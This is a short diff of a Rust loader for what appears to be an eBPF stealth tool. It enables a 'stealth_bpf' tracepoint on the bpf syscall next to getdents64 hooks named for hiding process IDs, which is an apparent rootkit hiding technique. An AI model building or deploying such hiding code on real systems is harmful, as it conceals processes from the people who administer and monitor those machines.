@@ -66,7 +66,7 @@ async fn main() -> anyhow::Result<()> {
     }
 
     let tracepoints = vec![
-        //SyscallTracepoint::from(("stealth_bpf", "sys_enter_bpf")),
+        SyscallTracepoint::from(("stealth_bpf", "sys_enter_bpf")),
         SyscallTracepoint::from(("stealth_pid_enter", "sys_enter_getdents64")),
         SyscallTracepoint::from(("stealth_pid_exit", "sys_exit_getdents64")),
     ];
@@ -212,7 +212,7 @@ async fn main() -> anyhow::Result<()> {
     //     });
     //     ctr += 1;
     // }
-    //info!("{} pid parsed", ctr);
+    // info!("{} pid parsed", ctr);
     println!("Exiting...");
 
     Ok(())
